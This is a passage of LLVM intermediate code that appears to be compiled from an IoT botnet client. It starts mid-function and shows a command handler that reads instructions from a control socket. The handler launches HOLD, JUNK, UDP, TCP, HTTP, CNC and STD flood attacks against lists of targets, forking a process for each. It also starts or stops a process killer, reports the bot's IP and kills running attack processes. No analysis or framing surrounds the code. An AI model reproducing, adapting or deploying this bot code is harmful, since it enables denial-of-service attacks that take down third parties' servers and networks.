  %26 = call i64 @write(i32 %15, i8* undef, i64 %25) #3
  %27 = icmp eq i64 %26, %25
  br i1 %27, label %.preheader.preheader, label %.loopexit

.preheader.preheader:                             ; preds = %22
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %31
  %.02830 = phi i32 [ %35, %31 ], [ 0, %.preheader.preheader ]
  %28 = call i64 @read(i32 %15, i8* nonnull %7, i64 1) #3
  %29 = trunc i64 %28 to i32
  %30 = icmp eq i32 %29, 1
  br i1 %30, label %31, label %.loopexit.loopexit

; <label>:31:                                     ; preds = %.preheader
  %32 = shl i32 %.02830, 8
  %33 = load i8, i8* %7, align 1
  %34 = sext i8 %33 to i32
  %35 = or i32 %34, %32
  %36 = icmp eq i32 %35, 218762506
  br i1 %36, label %37, label %.preheader

; <label>:37:                                     ; preds = %31
  %38 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i64 0, i64 0))
  %39 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 0
  %40 = call i64 @read(i32 %15, i8* nonnull %39, i64 128) #3
  %41 = trunc i64 %40 to i32
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %37
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %43 = phi i64 [ %46, %.lr.ph ], [ %40, %.lr.ph.preheader ]
  %sext29 = shl i64 %43, 32
  %44 = ashr exact i64 %sext29, 32
  %45 = call i64 @write(i32 %14, i8* nonnull %39, i64 %44) #3
  %46 = call i64 @read(i32 %15, i8* nonnull %39, i64 128) #3
  %47 = trunc i64 %46 to i32
  %48 = icmp slt i32 %47, 1
  br i1 %48, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %37
  %49 = call i32 @close(i32 %15) #3
  %50 = call i32 @close(i32 %14) #3
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %22, %18, %4, %._crit_edge
  %.0 = phi i32 [ 1, %._crit_edge ], [ 0, %4 ], [ 0, %18 ], [ 0, %22 ], [ 0, %.loopexit.loopexit ]
  ret i32 %.0
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @UpdateBins() local_unnamed_addr #13 {
  %1 = tail call i32 @findwritedir()
  %2 = tail call i32 @chdir(i8* undef) #3
  tail call void @llvm.trap()
  unreachable
}

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #16
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i64 0, i64 0))
  br label %.loopexit

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i64 0, i64 0)) #16
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  tail call void @UpdateBins()
  unreachable

; <label>:13:                                     ; preds = %9
  %14 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i64 0, i64 0)) #16
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %33

; <label>:16:                                     ; preds = %13
  %17 = getelementptr inbounds i8*, i8** %1, i64 1
  %18 = load i8*, i8** %17, align 8
  %19 = tail call i32 @strcmp(i8* %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i64 0, i64 0)) #16
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %25

; <label>:21:                                     ; preds = %16
  %22 = tail call i32 (...) @killer_kill() #3
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i64 0, i64 0))
  %.pre = load i8*, i8** %17, align 8
  br label %25

; <label>:25:                                     ; preds = %16, %21
  %26 = phi i8* [ %18, %16 ], [ %.pre, %21 ]
  %27 = tail call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i64 0, i64 0)) #16
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %.loopexit

; <label>:29:                                     ; preds = %25
  %30 = tail call i32 (...) @killer_init() #3
  %31 = load i32, i32* @mainCommSock, align 4
  %32 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %31, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.115, i64 0, i64 0))
  br label %.loopexit

; <label>:33:                                     ; preds = %13
  %34 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.116, i64 0, i64 0)) #16
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* @mainCommSock, align 4
  %38 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %39 = tail call i8* @inet_ntoa(i32 %38) #3
  %40 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %37, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i64 0, i64 0), i8* %39)
  br label %.loopexit

; <label>:41:                                     ; preds = %33
  %42 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.118, i64 0, i64 0)) #16
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %70

; <label>:44:                                     ; preds = %41
  %45 = icmp slt i32 %0, 4
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %44
  %47 = getelementptr inbounds i8*, i8** %1, i64 2
  %48 = load i8*, i8** %47, align 8
  %49 = tail call i32 @atoi(i8* %48) #16
  %50 = icmp slt i32 %49, 1
  br i1 %50, label %.loopexit, label %51

; <label>:51:                                     ; preds = %46
  %52 = getelementptr inbounds i8*, i8** %1, i64 3
  %53 = load i8*, i8** %52, align 8
  %54 = tail call i32 @atoi(i8* %53) #16
  %55 = icmp slt i32 %54, 1
  br i1 %55, label %.loopexit, label %56

; <label>:56:                                     ; preds = %51
  %57 = getelementptr inbounds i8*, i8** %1, i64 1
  %58 = load i8*, i8** %57, align 8
  %strchr = tail call i8* @strchr(i8* %58, i32 44)
  %59 = icmp eq i8* %strchr, null
  br i1 %59, label %66, label %.preheader.preheader

.preheader.preheader:                             ; preds = %56
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %62
  %.sink = phi i8* [ null, %62 ], [ %58, %.preheader.preheader ]
  %60 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %61 = icmp eq i8* %60, null
  br i1 %61, label %.loopexit.loopexit, label %62

; <label>:62:                                     ; preds = %.preheader
  %63 = tail call i32 @listFork()
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %.preheader

; <label>:65:                                     ; preds = %62
  tail call void @sendHOLD(i8* nonnull %60, i32 %49, i32 %54)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:66:                                     ; preds = %56
  %67 = tail call i32 @listFork()
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %69, label %.loopexit

; <label>:69:                                     ; preds = %66
  tail call void @sendHOLD(i8* %58, i32 %49, i32 %54)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:70:                                     ; preds = %41
  %71 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i64 0, i64 0)) #16
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %73, label %101

; <label>:73:                                     ; preds = %70
  %74 = icmp slt i32 %0, 4
  br i1 %74, label %.loopexit, label %75

; <label>:75:                                     ; preds = %73
  %76 = getelementptr inbounds i8*, i8** %1, i64 2
  %77 = load i8*, i8** %76, align 8
  %78 = tail call i32 @atoi(i8* %77) #16
  %79 = icmp slt i32 %78, 1
  br i1 %79, label %.loopexit, label %80

; <label>:80:                                     ; preds = %75
  %81 = getelementptr inbounds i8*, i8** %1, i64 3
  %82 = load i8*, i8** %81, align 8
  %83 = tail call i32 @atoi(i8* %82) #16
  %84 = icmp slt i32 %83, 1
  br i1 %84, label %.loopexit, label %85

; <label>:85:                                     ; preds = %80
  %86 = getelementptr inbounds i8*, i8** %1, i64 1
  %87 = load i8*, i8** %86, align 8
  %strchr176 = tail call i8* @strchr(i8* %87, i32 44)
  %88 = icmp eq i8* %strchr176, null
  br i1 %88, label %97, label %.preheader193.preheader

.preheader193.preheader:                          ; preds = %85
  br label %.preheader193

.preheader193:                                    ; preds = %.preheader193.preheader, %91
  %.sink182 = phi i8* [ null, %91 ], [ %87, %.preheader193.preheader ]
  %89 = tail call i8* @strtok(i8* %.sink182, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %90 = icmp eq i8* %89, null
  br i1 %90, label %.loopexit.loopexit248, label %91

; <label>:91:                                     ; preds = %.preheader193
  %92 = tail call i32 @listFork()
  %93 = icmp eq i32 %92, 0
  br i1 %93, label %94, label %.preheader193

; <label>:94:                                     ; preds = %91
  tail call void @sendJUNK(i8* nonnull %89, i32 %78, i32 %83)
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = tail call i32 @close(i32 %95) #3
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:97:                                     ; preds = %85
  %98 = tail call i32 @listFork()
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %.loopexit

; <label>:100:                                    ; preds = %97
  tail call void @sendJUNK(i8* %87, i32 %78, i32 %83)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:101:                                    ; preds = %70
  %102 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i64 0, i64 0)) #16
  %103 = icmp eq i32 %102, 0
  br i1 %103, label %104, label %171

; <label>:104:                                    ; preds = %101
  %105 = icmp slt i32 %0, 6
  br i1 %105, label %.loopexit, label %106

; <label>:106:                                    ; preds = %104
  %107 = getelementptr inbounds i8*, i8** %1, i64 3
  %108 = load i8*, i8** %107, align 8
  %109 = tail call i32 @atoi(i8* %108) #16
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %.loopexit, label %111

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds i8*, i8** %1, i64 2
  %113 = load i8*, i8** %112, align 8
  %114 = tail call i32 @atoi(i8* %113) #16
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %.loopexit, label %116

; <label>:116:                                    ; preds = %111
  %117 = getelementptr inbounds i8*, i8** %1, i64 4
  %118 = load i8*, i8** %117, align 8
  %119 = tail call i32 @atoi(i8* %118) #16
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %.loopexit, label %121

; <label>:121:                                    ; preds = %116
  %122 = getelementptr inbounds i8*, i8** %1, i64 5
  %123 = load i8*, i8** %122, align 8
  %124 = tail call i32 @atoi(i8* %123) #16
  %125 = icmp eq i32 %124, -1
  %126 = icmp sgt i32 %124, 65500
  %127 = or i1 %126, %125
  %128 = icmp sgt i32 %119, 32
  %or.cond184 = or i1 %128, %127
  br i1 %or.cond184, label %.loopexit, label %129

; <label>:129:                                    ; preds = %121
  %130 = icmp eq i32 %0, 7
  br i1 %130, label %131, label %136

; <label>:131:                                    ; preds = %129
  %132 = getelementptr inbounds i8*, i8** %1, i64 6
  %133 = load i8*, i8** %132, align 8
  %134 = tail call i32 @atoi(i8* %133) #16
  %135 = icmp slt i32 %134, 1
  br i1 %135, label %.loopexit, label %136

; <label>:136:                                    ; preds = %131, %129
  %137 = getelementptr inbounds i8*, i8** %1, i64 1
  %138 = load i8*, i8** %137, align 8
  %139 = tail call i32 @atoi(i8* %113) #16
  %140 = tail call i32 @atoi(i8* %108) #16
  %141 = tail call i32 @atoi(i8* %118) #16
  %142 = tail call i32 @atoi(i8* %123) #16
  %143 = icmp sgt i32 %0, 6
  br i1 %143, label %144, label %.thread191

; <label>:144:                                    ; preds = %136
  %145 = getelementptr inbounds i8*, i8** %1, i64 6
  %146 = load i8*, i8** %145, align 8
  %147 = tail call i32 @atoi(i8* %146) #16
  br i1 %130, label %.thread191, label %148

; <label>:148:                                    ; preds = %144
  %149 = getelementptr inbounds i8*, i8** %1, i64 7
  %150 = load i8*, i8** %149, align 8
  %151 = tail call i32 @atoi(i8* %150) #16
  %152 = icmp sgt i32 %0, 8
  br i1 %152, label %153, label %.thread191

; <label>:153:                                    ; preds = %148
  %154 = getelementptr inbounds i8*, i8** %1, i64 8
  %155 = load i8*, i8** %154, align 8
  %156 = tail call i32 @atoi(i8* %155) #16
  br label %.thread191

.thread191:                                       ; preds = %144, %136, %148, %153
  %157 = phi i32 [ %151, %153 ], [ %151, %148 ], [ 1000000, %144 ], [ 1000000, %136 ]
  %158 = phi i32 [ %147, %153 ], [ %147, %148 ], [ %147, %144 ], [ 1000, %136 ]
  %159 = phi i32 [ %156, %153 ], [ 0, %148 ], [ 0, %144 ], [ 0, %136 ]
  %strchr177 = tail call i8* @strchr(i8* %138, i32 44)
  %160 = icmp eq i8* %strchr177, null
  br i1 %160, label %167, label %.preheader195.preheader

.preheader195.preheader:                          ; preds = %.thread191
  br label %.preheader195

.preheader195:                                    ; preds = %.preheader195.preheader, %163
  %.sink185 = phi i8* [ null, %163 ], [ %138, %.preheader195.preheader ]
  %161 = tail call i8* @strtok(i8* %.sink185, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %162 = icmp eq i8* %161, null
  br i1 %162, label %.loopexit.loopexit249, label %163

; <label>:163:                                    ; preds = %.preheader195
  %164 = tail call i32 @listFork()
  %165 = icmp eq i32 %164, 0
  br i1 %165, label %166, label %.preheader195

; <label>:166:                                    ; preds = %163
  tail call void @sendUDP(i8* nonnull %161, i32 %139, i32 %140, i32 %141, i32 %142, i32 %158, i32 %157, i32 %159)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:167:                                    ; preds = %.thread191
  %168 = tail call i32 @listFork()
  %169 = icmp eq i32 %168, 0
  br i1 %169, label %170, label %.loopexit

; <label>:170:                                    ; preds = %167
  tail call void @sendUDP(i8* %138, i32 %139, i32 %140, i32 %141, i32 %142, i32 %158, i32 %157, i32 %159)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:171:                                    ; preds = %101
  %172 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i64 0, i64 0)) #16
  %173 = icmp eq i32 %172, 0
  br i1 %173, label %174, label %237

; <label>:174:                                    ; preds = %171
  %175 = icmp slt i32 %0, 6
  br i1 %175, label %.loopexit, label %176

; <label>:176:                                    ; preds = %174
  %177 = getelementptr inbounds i8*, i8** %1, i64 3
  %178 = load i8*, i8** %177, align 8
  %179 = tail call i32 @atoi(i8* %178) #16
  %180 = icmp eq i32 %179, -1
  br i1 %180, label %.loopexit, label %181

; <label>:181:                                    ; preds = %176
  %182 = getelementptr inbounds i8*, i8** %1, i64 2
  %183 = load i8*, i8** %182, align 8
  %184 = tail call i32 @atoi(i8* %183) #16
  %185 = icmp eq i32 %184, -1
  br i1 %185, label %.loopexit, label %186

; <label>:186:                                    ; preds = %181
  %187 = getelementptr inbounds i8*, i8** %1, i64 4
  %188 = load i8*, i8** %187, align 8
  %189 = tail call i32 @atoi(i8* %188) #16
  %190 = icmp eq i32 %189, -1
  %191 = icmp sgt i32 %189, 32
  %or.cond186 = or i1 %190, %191
  br i1 %or.cond186, label %.loopexit, label %192

; <label>:192:                                    ; preds = %186
  %193 = icmp sgt i32 %0, 6
  br i1 %193, label %194, label %.thread192

; <label>:194:                                    ; preds = %192
  %195 = getelementptr inbounds i8*, i8** %1, i64 6
  %196 = load i8*, i8** %195, align 8
  %197 = tail call i32 @atoi(i8* %196) #16
  %198 = icmp slt i32 %197, 0
  br i1 %198, label %.loopexit, label %199

; <label>:199:                                    ; preds = %194
  %200 = icmp eq i32 %0, 8
  br i1 %200, label %201, label %.thread192

; <label>:201:                                    ; preds = %199
  %202 = getelementptr inbounds i8*, i8** %1, i64 7
  %203 = load i8*, i8** %202, align 8
  %204 = tail call i32 @atoi(i8* %203) #16
  %205 = icmp slt i32 %204, 1
  br i1 %205, label %.loopexit, label %.thread192

.thread192:                                       ; preds = %192, %201, %199
  %206 = phi i1 [ true, %201 ], [ false, %199 ], [ false, %192 ]
  %207 = getelementptr inbounds i8*, i8** %1, i64 1
  %208 = load i8*, i8** %207, align 8
  %209 = tail call i32 @atoi(i8* %183) #16
  %210 = tail call i32 @atoi(i8* %178) #16
  %211 = tail call i32 @atoi(i8* %188) #16
  %212 = getelementptr inbounds i8*, i8** %1, i64 5
  %213 = load i8*, i8** %212, align 8
  br i1 %206, label %214, label %218

; <label>:214:                                    ; preds = %.thread192
  %215 = getelementptr inbounds i8*, i8** %1, i64 7
  %216 = load i8*, i8** %215, align 8
  %217 = tail call i32 @atoi(i8* %216) #16
  br label %218

; <label>:218:                                    ; preds = %.thread192, %214
  %219 = phi i32 [ %217, %214 ], [ 10, %.thread192 ]
  br i1 %193, label %220, label %224

; <label>:220:                                    ; preds = %218
  %221 = getelementptr inbounds i8*, i8** %1, i64 6
  %222 = load i8*, i8** %221, align 8
  %223 = tail call i32 @atoi(i8* %222) #16
  br label %224

; <label>:224:                                    ; preds = %218, %220
  %225 = phi i32 [ %223, %220 ], [ 0, %218 ]
  %strchr178 = tail call i8* @strchr(i8* %208, i32 44)
  %226 = icmp eq i8* %strchr178, null
  br i1 %226, label %233, label %.preheader197.preheader

.preheader197.preheader:                          ; preds = %224
  br label %.preheader197

.preheader197:                                    ; preds = %.preheader197.preheader, %229
  %.sink187 = phi i8* [ null, %229 ], [ %208, %.preheader197.preheader ]
  %227 = tail call i8* @strtok(i8* %.sink187, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %228 = icmp eq i8* %227, null
  br i1 %228, label %.loopexit.loopexit250, label %229

; <label>:229:                                    ; preds = %.preheader197
  %230 = tail call i32 @listFork()
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %.preheader197

; <label>:232:                                    ; preds = %229
  tail call void @sendTCP(i8* nonnull %227, i32 %209, i32 %210, i32 %211, i8* %213, i32 %225, i32 %219)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:233:                                    ; preds = %224
  %234 = tail call i32 @listFork()
  %235 = icmp eq i32 %234, 0
  br i1 %235, label %236, label %.loopexit

; <label>:236:                                    ; preds = %233
  tail call void @sendTCP(i8* %208, i32 %209, i32 %210, i32 %211, i8* %213, i32 %225, i32 %219)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:237:                                    ; preds = %171
  %238 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i64 0, i64 0)) #16
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %262

; <label>:240:                                    ; preds = %237
  %241 = icmp slt i32 %0, 4
  br i1 %241, label %.loopexit, label %242

; <label>:242:                                    ; preds = %240
  %243 = getelementptr inbounds i8*, i8** %1, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = tail call i32 @atoi(i8* %244) #16
  %246 = icmp slt i32 %245, 1
  br i1 %246, label %.loopexit, label %247

; <label>:247:                                    ; preds = %242
  %248 = getelementptr inbounds i8*, i8** %1, i64 3
  %249 = load i8*, i8** %248, align 8
  %250 = tail call i32 @atoi(i8* %249) #16
  %251 = icmp slt i32 %250, 1
  br i1 %251, label %.loopexit, label %252

; <label>:252:                                    ; preds = %247
  %253 = getelementptr inbounds i8*, i8** %1, i64 1
  %254 = load i8*, i8** %253, align 8
  %strchr179 = tail call i8* @strchr(i8* %254, i32 44)
  %255 = icmp eq i8* %strchr179, null
  br i1 %255, label %261, label %.preheader199

.preheader199:                                    ; preds = %252
  %256 = tail call i8* @strtok(i8* %254, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %257 = icmp eq i8* %256, null
  br i1 %257, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader199
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %258 = phi i8* [ %259, %.lr.ph ], [ %256, %.lr.ph.preheader ]
  tail call void @sendHTTP(i8* nonnull %258, i32 %245, i32 %250)
  %259 = tail call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %260 = icmp eq i8* %259, null
  br i1 %260, label %.loopexit.loopexit251, label %.lr.ph

; <label>:261:                                    ; preds = %252
  tail call void @sendHTTP(i8* %254, i32 %245, i32 %250)
  br label %.loopexit

; <label>:262:                                    ; preds = %237
  %263 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i64 0, i64 0)) #16
  %264 = icmp eq i32 %263, 0
  br i1 %264, label %265, label %293

; <label>:265:                                    ; preds = %262
  %266 = icmp slt i32 %0, 4
  br i1 %266, label %.loopexit, label %267

; <label>:267:                                    ; preds = %265
  %268 = getelementptr inbounds i8*, i8** %1, i64 2
  %269 = load i8*, i8** %268, align 8
  %270 = tail call i32 @atoi(i8* %269) #16
  %271 = icmp slt i32 %270, 1
  br i1 %271, label %.loopexit, label %272

; <label>:272:                                    ; preds = %267
  %273 = getelementptr inbounds i8*, i8** %1, i64 3
  %274 = load i8*, i8** %273, align 8
  %275 = tail call i32 @atoi(i8* %274) #16
  %276 = icmp slt i32 %275, 1
  br i1 %276, label %.loopexit, label %277

; <label>:277:                                    ; preds = %272
  %278 = getelementptr inbounds i8*, i8** %1, i64 1
  %279 = load i8*, i8** %278, align 8
  %strchr180 = tail call i8* @strchr(i8* %279, i32 44)
  %280 = icmp eq i8* %strchr180, null
  br i1 %280, label %289, label %.preheader201.preheader

.preheader201.preheader:                          ; preds = %277
  br label %.preheader201

.preheader201:                                    ; preds = %.preheader201.preheader, %283
  %.sink189 = phi i8* [ null, %283 ], [ %279, %.preheader201.preheader ]
  %281 = tail call i8* @strtok(i8* %.sink189, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %282 = icmp eq i8* %281, null
  br i1 %282, label %.loopexit.loopexit252, label %283

; <label>:283:                                    ; preds = %.preheader201
  %284 = tail call i32 @listFork()
  %285 = icmp eq i32 %284, 0
  br i1 %285, label %286, label %.preheader201

; <label>:286:                                    ; preds = %283
  tail call void @sendCNC(i8* nonnull %281, i32 %270, i32 %275)
  %287 = load i32, i32* @mainCommSock, align 4
  %288 = tail call i32 @close(i32 %287) #3
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:289:                                    ; preds = %277
  %290 = tail call i32 @listFork()
  %291 = icmp eq i32 %290, 0
  br i1 %291, label %292, label %.loopexit

; <label>:292:                                    ; preds = %289
  tail call void @sendCNC(i8* %279, i32 %270, i32 %275)
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:293:                                    ; preds = %262
  %294 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i64 0, i64 0)) #16
  %295 = icmp eq i32 %294, 0
  br i1 %295, label %296, label %318

; <label>:296:                                    ; preds = %293
  %297 = icmp slt i32 %0, 4
  br i1 %297, label %.loopexit, label %298

; <label>:298:                                    ; preds = %296
  %299 = getelementptr inbounds i8*, i8** %1, i64 2
  %300 = load i8*, i8** %299, align 8
  %301 = tail call i32 @atoi(i8* %300) #16
  %302 = icmp slt i32 %301, 1
  br i1 %302, label %.loopexit, label %303

; <label>:303:                                    ; preds = %298
  %304 = getelementptr inbounds i8*, i8** %1, i64 3
  %305 = load i8*, i8** %304, align 8
  %306 = tail call i32 @atoi(i8* %305) #16
  %307 = icmp slt i32 %306, 1
  br i1 %307, label %.loopexit, label %308

; <label>:308:                                    ; preds = %303
  %309 = getelementptr inbounds i8*, i8** %1, i64 1
  %310 = load i8*, i8** %309, align 8
  %strchr181 = tail call i8* @strchr(i8* %310, i32 44)
  %311 = icmp eq i8* %strchr181, null
  br i1 %311, label %317, label %.preheader203

.preheader203:                                    ; preds = %308
  %312 = tail call i8* @strtok(i8* %310, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %313 = icmp eq i8* %312, null
  br i1 %313, label %.loopexit, label %.lr.ph211.preheader

.lr.ph211.preheader:                              ; preds = %.preheader203
  br label %.lr.ph211

.lr.ph211:                                        ; preds = %.lr.ph211.preheader, %.lr.ph211
  %314 = phi i8* [ %315, %.lr.ph211 ], [ %312, %.lr.ph211.preheader ]
  tail call void @sendSTD(i8* nonnull %314, i32 %301, i32 %306)
  %315 = tail call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %316 = icmp eq i8* %315, null
  br i1 %316, label %.loopexit.loopexit253, label %.lr.ph211

; <label>:317:                                    ; preds = %308
  tail call void @sendSTD(i8* %310, i32 %301, i32 %306)
  br label %.loopexit

; <label>:318:                                    ; preds = %293
  %319 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i64 0, i64 0)) #16
  %320 = icmp eq i32 %319, 0
  br i1 %320, label %.preheader205, label %.loopexit

.preheader205:                                    ; preds = %318
  %321 = load i64, i64* @numpids, align 8
  %322 = icmp eq i64 %321, 0
  br i1 %322, label %._crit_edge.thread, label %.lr.ph214.preheader

.lr.ph214.preheader:                              ; preds = %.preheader205
  br label %.lr.ph214

._crit_edge.thread:                               ; preds = %.preheader205
  %323 = load i32, i32* @mainCommSock, align 4
  br label %345

.lr.ph214:                                        ; preds = %.lr.ph214.preheader, %337
  %.0213 = phi i64 [ %338, %337 ], [ 0, %.lr.ph214.preheader ]
  %.0168212 = phi i32 [ %.1, %337 ], [ 0, %.lr.ph214.preheader ]
  %324 = load i32*, i32** @pids, align 8
  %325 = getelementptr inbounds i32, i32* %324, i64 %.0213
  %326 = load i32, i32* %325, align 4
  %327 = icmp eq i32 %326, 0
  br i1 %327, label %337, label %328

; <label>:328:                                    ; preds = %.lr.ph214
  %329 = tail call i32 @getpid() #3
  %330 = icmp eq i32 %326, %329
  br i1 %330, label %337, label %331

; <label>:331:                                    ; preds = %328
  %332 = load i32*, i32** @pids, align 8
  %333 = getelementptr inbounds i32, i32* %332, i64 %.0213
  %334 = load i32, i32* %333, align 4
  %335 = tail call i32 @kill(i32 %334, i32 9) #3
  %336 = add nsw i32 %.0168212, 1
  br label %337

; <label>:337:                                    ; preds = %328, %.lr.ph214, %331
  %.1 = phi i32 [ %336, %331 ], [ %.0168212, %328 ], [ %.0168212, %.lr.ph214 ]
  %338 = add i64 %.0213, 1
  %339 = load i64, i64* @numpids, align 8
  %340 = icmp ult i64 %338, %339
  br i1 %340, label %.lr.ph214, label %._crit_edge

._crit_edge:                                      ; preds = %337
  %341 = icmp sgt i32 %.1, 0
  %342 = load i32, i32* @mainCommSock, align 4
  br i1 %341, label %343, label %345

; <label>:343:                                    ; preds = %._crit_edge
  %344 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %342, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i64 0, i64 0), i32 %.1)
  br label %.loopexit

; <label>:345:                                    ; preds = %._crit_edge.thread, %._crit_edge
  %346 = phi i32 [ %323, %._crit_edge.thread ], [ %342, %._crit_edge ]
  %347 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %346, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i64 0, i64 0))
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit.loopexit248:                            ; preds = %.preheader193
  br label %.loopexit

.loopexit.loopexit249:                            ; preds = %.preheader195
  br label %.loopexit

.loopexit.loopexit250:                            ; preds = %.preheader197
  br label %.loopexit

.loopexit.loopexit251:                            ; preds = %.lr.ph
  br label %.loopexit

.loopexit.loopexit252:                            ; preds = %.preheader201
  br label %.loopexit

.loopexit.loopexit253:                            ; preds = %.lr.ph211
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit253, %.loopexit.loopexit252, %.loopexit.loopexit251, %.loopexit.loopexit250, %.loopexit.loopexit249, %.loopexit.loopexit248, %.loopexit.loopexit, %.preheader203, %.preheader199, %318, %289, %233, %167, %97, %66, %25, %343, %345, %317, %296, %298, %303, %265, %267, %272, %261, %240, %242, %247, %174, %176, %181, %186, %194, %201, %104, %106, %111, %116, %121, %131, %73, %75, %80, %44, %46, %51, %29, %36, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #14

declare i32 @killer_kill(...) local_unnamed_addr #4

declare i32 @killer_init(...) local_unnamed_addr #4

